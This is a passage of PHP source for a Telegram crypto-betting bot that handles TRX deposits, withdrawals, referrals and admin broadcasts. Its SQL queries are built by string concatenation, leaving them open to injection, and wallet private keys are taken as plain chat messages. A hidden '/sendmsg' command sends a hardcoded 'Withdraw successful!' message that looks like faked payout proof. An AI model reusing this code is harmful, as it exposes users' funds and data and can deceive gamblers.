                        'one_time_keyboard' => false,
                        'resize_keyboard' => true
                    )));

                    $sql = "SELECT walletAddress FROM wallet WHERE active = 1";
                    $result = mysqli_query($Conn, $sql);
                    $row = mysqli_fetch_row($result);
                    $AdminwalletAddress = $row[0];

                    apiRequest("sendMessage", array('chat_id' => $tg_id, 'parse_mode' => 'HTML', "text" => "🔻 <i>After you deposit send your transaction id below to verfiy you're deposit </i>🔻

▫ Example :<b>
8023892241e124ef79a14a80678db2145469e2d458056c9543e9c1bf3ab9462c</b>", 'reply_markup' => array(
                        'keyboard' => $cancel_keyboard,
                        'one_time_keyboard' => false,
                        'resize_keyboard' => true
                    )));

                    $sql = "UPDATE `users` SET `status` = 22 WHERE tg_id = '" . $tg_id . "'";
                    $result = mysqli_query($Conn, $sql);
                }
            } elseif ($text === "📈 Statics") {

                $sql = "SELECT total_users FROM total_user_counter";
                $result = mysqli_query($Conn, $sql);
                $row = mysqli_fetch_row($result);
                $total_users = $row[0];

                $sql = "SELECT ROUND(SUM(amount),3) AS total_withdraw FROM withdraw WHERE amount IS NOT NULL";
                $result = mysqli_query($Conn, $sql);
                $row = mysqli_fetch_row($result);
                $total_withdraw = $row[0];

                apiRequest("sendMessage", array('chat_id' => $tg_id, 'parse_mode' => 'HTML', "text" => '👤 Active Users : <code>' . $total_users . '</code> Users

📤 Total Withdrawn : <code>' . $total_withdraw . '</code> TRX', 'reply_markup' => array(
                    'keyboard' => $main_keyboard,
                    'one_time_keyboard' => false,
                    'resize_keyboard' => true
                )));
            } elseif ($text === "✅ Confirm") {

                $Transaction_result = EasyTransferByPrivate($amount, $walletAddress);
                $Transaction_success = $Transaction_result['result']['result'];
                $txID = $Transaction_result['transaction']['txID'];

                if ($Transaction_success == "true") {

                    $deduct = $balance - $amount;

                    $sql = "UPDATE `users` SET `balance` = $deduct, `amount` = 0 WHERE tg_id = '" . $tg_id . "'";
                    $result = mysqli_query($Conn, $sql);

                    $sql = "INSERT INTO `withdraw`(`tg_id`, `amount`, `wallet`, `txID`) VALUES ('" . $tg_id . "','" . $amount . "','" . $walletAddress . "','" . $txID . "')";
                    $result = mysqli_query($Conn, $sql);

                    apiRequest("sendMessage", array('chat_id' => $tg_id, 'parse_mode' => 'HTML', "text" => "🟢 Withdraw Request Paid 🟢

▫ You withdrawn $amount TRX  to the following wallet address :

<code>$walletAddress</code>

⛳ Transaction Id : <a href='https://tronscan.io/#/transaction/$txID'>$txID</a>

📊 Your Current Balance : <code>$deduct</code> TRX", 'reply_markup' => array(
                        'keyboard' => $main_keyboard,
                        'one_time_keyboard' => false,
                        'resize_keyboard' => true
                    )));

                    apiRequest("sendMessage", array('chat_id' => $join_channel_username, 'parse_mode' => 'HTML', "text" => "📤 <b>New Withdraw Paid</b>

✅ $tg_firstname withdrawn <code>$amount</code> TRX successfully

<i>$walletAddress</i>

<a href='https://tronscan.io/#/transaction/$txID'>$txID</a>"));
                } else {

                    apiRequest("sendMessage", array('chat_id' => $tg_id, 'parse_mode' => 'HTML', "text" => '❌ <i>Something went wrong Please try later !</i>', 'reply_markup' => array(
                        'keyboard' => $main_keyboard,
                        'one_time_keyboard' => false,
                        'resize_keyboard' => true
                    )));
                }
            } elseif ($text === "⚙️ Admin") {
                apiRequestsJson();
                apiRequest("sendMessage", array('chat_id' => $tg_id, 'parse_mode' => 'HTML', "text" => '⚙️ Admin Settings', 'reply_markup' => array(
                    'keyboard' => $admin_keyboard,
                    'one_time_keyboard' => false,
                    'resize_keyboard' => true
                )));
            } elseif ($text === "📞 Support") {

                $sql = "UPDATE `users` SET `status` = 25 WHERE tg_id = '" . $tg_id . "'";
                $result = mysqli_query($Conn, $sql);

                apiRequest("sendMessage", array('chat_id' => $tg_id, 'parse_mode' => 'HTML', "text" => '<b>▫ Direct Chat Support</b>

🔻 Write your message to our support team below 🔻', 'reply_markup' => array(
                    'keyboard' => $cancel_keyboard,
                    'one_time_keyboard' => false,
                    'resize_keyboard' => true
                )));
            } elseif ($text === "📲 Invite") {

                $sql = "SELECT referral_counter, tg_referral_code FROM users WHERE tg_id = '" . $tg_id . "'";
                $result = mysqli_query($Conn, $sql);
                $result_row = mysqli_fetch_row($result);
                $referral_counter = $result_row[0];
                $tg_referral_code = $result_row[1];

                apiRequest("sendMessage", array('chat_id' => $tg_id, 'parse_mode' => 'HTML', "text" => '👋 Share your link to your freinds & get <code>5%</code> of there any bet they made !

▫ You invited <code>' . $referral_counter . '</code> Freinds

▫ Invitation Link : https://t.me/TRX_Betting_Bot?start=' . $tg_referral_code . '

📊 <i>Earn Unlimited TRX by only sharing your link !</i>', 'reply_markup' => array(
                    'keyboard' => $main_keyboard,
                    'one_time_keyboard' => false,
                    'resize_keyboard' => true
                )));
            } elseif ($text === "🔝 Main Menu") {

                apiRequest("sendMessage", array('chat_id' => $tg_id, 'parse_mode' => 'HTML', "text" => '🔝 Main Menu', 'reply_markup' => array(
                    'keyboard' => $main_keyboard,
                    'one_time_keyboard' => false,
                    'resize_keyboard' => true
                )));
            } elseif ($text === "🔑 Change Private Key") {
                apiRequest("sendMessage", array('chat_id' => $tg_id, 'parse_mode' => 'HTML', "text" => 'Send the new private key.', 'reply_markup' => array(
                    'keyboard' => $cancel_keyboard,
                    'one_time_keyboard' => false,
                    'resize_keyboard' => true
                )));

                $sql = "UPDATE `users` SET `status` = 8 WHERE tg_id = '" . $tg_id . "'";
                $result = mysqli_query($Conn, $sql);
            } elseif ($text === "🔖 Send Message") {

                apiRequest("sendMessage", array('chat_id' => $tg_id, 'parse_mode' => 'HTML', "text" => '🔖 Send Message

Please send the username you want to message.', 'reply_markup' => array(
                    'keyboard' => $cancel_keyboard,
                    'one_time_keyboard' => false,
                    'resize_keyboard' => true
                )));

                $sql = "UPDATE `users` SET `status` = 6 WHERE tg_id = '" . $tg_id . "'";
                $result = mysqli_query($Conn, $sql);
            } elseif ($text === "💬 Broadcast Message") {

                apiRequest("sendMessage", array('chat_id' => $tg_id, 'parse_mode' => 'HTML', "text" => '💬 Broadcast Message

Sens the message you want to Broadcast', 'reply_markup' => array(
                    'keyboard' => $cancel_broadcast,
                    'one_time_keyboard' => false,
                    'resize_keyboard' => true
                )));

                $sql = "UPDATE `users` SET `status` = 5 WHERE tg_id = '" . $tg_id . "'";
                $result = mysqli_query($Conn, $sql);
            } elseif ($text === "💬 Show Broadcast") {

                $sql = "SELECT message, type, caption FROM broadcast";
                $result = mysqli_query($Conn, $sql);

                $join_channel = array(array(array("text" => "Join", "url" => $join_channel_link)));

                while ($arrayResult = mysqli_fetch_array($result)) {

                    if ($arrayResult["type"] == 'text') {
                        apiRequest("sendMessage", array('chat_id' => $tg_id, 'parse_mode' => 'HTML', "text" => $arrayResult["message"], 'reply_markup' => array(
                            'inline_keyboard' => $join_channel,
                            'one_time_keyboard' => true,
                            'resize_keyboard' => true
                        )));
                    }

                    if ($arrayResult["type"] == 'photo') {

                        if ($arrayResult["caption"] == 'null') {
                            apiRequest("sendPhoto", array('chat_id' => $tg_id, 'parse_mode' => 'HTML', "photo" => $arrayResult["message"]));
                        } else {
                            apiRequest("sendPhoto", array('chat_id' => $tg_id, 'parse_mode' => 'HTML', "caption" => $arrayResult["caption"], "photo" => $arrayResult["message"]));
                        }
                    }

                    if ($arrayResult["type"] == 'video') {
                        apiRequest("sendVideo", array('chat_id' => $tg_id, 'parse_mode' => 'HTML', "video" => $arrayResult["message"]));
                    }

                    if ($arrayResult["type"] == 'document') {
                        apiRequest("sendDocument", array('chat_id' => $tg_id, 'parse_mode' => 'HTML', "document" => $arrayResult["message"]));
                    }

                    if ($arrayResult["type"] == 'audio') {
                        apiRequest("sendAudio", array('chat_id' => $tg_id, 'parse_mode' => 'HTML', "audio" => $arrayResult["message"]));
                    }

                    if ($arrayResult["type"] == 'voice') {
                        apiRequest("sendVoice", array('chat_id' => $tg_id, 'parse_mode' => 'HTML', "voice" => $arrayResult["message"]));
                    }
                }

                apiRequest("sendMessage", array('chat_id' => $tg_id, 'parse_mode' => 'HTML', "text" => 'Click ✔️ Send Broadcast to Broadcast Message', 'reply_markup' => array(
                    'keyboard' => $broadcast_keyboard,
                    'one_time_keyboard' => false,
                    'resize_keyboard' => true
                )));
            } elseif ($text === "/sendmsg") {

                apiRequestJson("sendMessage", array('chat_id' => '346632926', "text" => 'Withdraw successful! you have withdrawed ', 'reply_markup' => array(
                    'keyboard' => $main_keyboard,
                    'one_time_keyboard' => false,
                    'resize_keyboard' => true
                )));
            } else {
                //apiRequest("sendMessage", array('chat_id' => $tg_id, 'parse_mode' => 'HTML', "text" => $text));
                //apiRequest("sendMessage", array('chat_id' => $tg_id, 'parse_mode' => 'HTML', "text" => 'Sorry! I understand only commands'));
            }
        }
    }

    mysqli_close($Conn);
}


define('WEBHOOK_URL', 'https://my-site.example.com/secret-path-for-webhooks/');

if (php_sapi_name() == 'cli') {
    // if run from console, set or delete webhook
    apiRequest('setWebhook', array('url' => isset($argv[1]) && $argv[1] == 'delete' ? '' : WEBHOOK_URL));
    exit;
}


$content = file_get_contents("php://input");
$update = json_decode($content, true);

if (!$update) {
    // receive wrong update, must not happen
    exit;
}

if (isset($update["message"])) {
    processMessage($update["message"]);
}

if (isset($update["callback_query"])) {
    processcallback($update["callback_query"]);
}
